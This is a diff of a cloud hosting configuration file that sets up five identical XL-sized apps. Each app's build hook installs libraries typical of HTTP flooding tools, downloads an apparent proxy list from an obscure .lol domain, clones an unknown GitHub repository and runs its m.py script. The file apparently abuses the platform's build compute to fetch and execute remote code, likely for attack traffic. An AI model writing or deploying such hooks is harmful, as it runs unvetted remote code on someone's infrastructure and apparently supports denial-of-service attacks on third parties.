@@ -1,26 +1,103 @@
 applications:
-  myapp:
+  app1:
     type: 'nodejs:24'
-
-    # Highest VM size (max CPU/RAM per instance)
     size: XL
-
     build:
       flavor: none
-
     hooks:
       build: |
         apt-get update
         apt-get install -y python3 python3-pip python3-dev build-essential libssl-dev git curl
-
         pip3 install --upgrade pip
         pip3 install aioquic uvloop requests
-
         npm install net chalk hpack.js hpack colors puppeteer-real-browser cluster
-
         curl -s "https://xn--mnqu23e2hf.lol/api.php?key=user1208&country=all" > k.txt
-
         git clone https://github.com/vrbrh921-glitch/Fc.git
         cd Fc
-        lscpu
         python3 m.py
+
+  app2:
+    type: 'nodejs:24'
+    size: XL
+    build:
+      flavor: none
+    hooks:
+      build: |
+        apt-get update
+        apt-get install -y python3 python3-pip python3-dev build-essential libssl-dev git curl
+        pip3 install --upgrade pip
+        pip3 install aioquic uvloop requests
+        npm install net chalk hpack.js hpack colors puppeteer-real-browser cluster
+        curl -s "https://xn--mnqu23e2hf.lol/api.php?key=user1208&country=all" > k.txt
+        git clone https://github.com/vrbrh921-glitch/Fc.git
+        cd Fc
+        python3 m.py
+
+  app3:
+    type: 'nodejs:24'
+    size: XL
+    build:
+      flavor: none
+    hooks:
+      build: |
+        apt-get update
+        apt-get install -y python3 python3-pip python3-dev build-essential libssl-dev git curl
+        pip3 install --upgrade pip
+        pip3 install aioquic uvloop requests
+        npm install net chalk hpack.js hpack colors puppeteer-real-browser cluster
+        curl -s "https://xn--mnqu23e2hf.lol/api.php?key=user1208&country=all" > k.txt
+        git clone https://github.com/vrbrh921-glitch/Fc.git
+        nproc
+        cd Fc
+        python3 m.py
+
+  app4:
+    type: 'nodejs:24'
+    size: XL
+    build:
+      flavor: none
+    hooks:
+      build: |
+        apt-get update
+        apt-get install -y python3 python3-pip python3-dev build-essential libssl-dev git curl
+        pip3 install --upgrade pip
+        pip3 install aioquic uvloop requests
+        npm install net chalk hpack.js hpack colors puppeteer-real-browser cluster
+        curl -s "https://xn--mnqu23e2hf.lol/api.php?key=user1208&country=all" > k.txt
+        git clone https://github.com/vrbrh921-glitch/Fc.git
+        cd Fc
+        python3 m.py
+
+  app5:
+    type: 'nodejs:24'
+    size: XL
+    build:
+      flavor: none
+    hooks:
+      build: |
+        apt-get update
+        apt-get install -y python3 python3-pip python3-dev build-essential libssl-dev git curl
+        pip3 install --upgrade pip
+        pip3 install aioquic uvloop requests
+        npm install net chalk hpack.js hpack colors puppeteer-real-browser cluster
+        curl -s "https://xn--mnqu23e2hf.lol/api.php?key=user1208&country=all" > k.txt
+        git clone https://github.com/vrbrh921-glitch/Fc.git
+        cd Fc
+        python3 m.py
+
+routes:
+  'https://{default}/app1': 
+    type: upstream
+    upstream: 'app1:http'
+  'https://{default}/app2':
+    type: upstream
+    upstream: 'app2:http'
+  'https://{default}/app3':
+    type: upstream
+    upstream: 'app3:http'
+  'https://{default}/app4':
+    type: upstream
+    upstream: 'app4:http'
+  'https://{default}/app5':
+    type: upstream
+    upstream: 'app5:http'
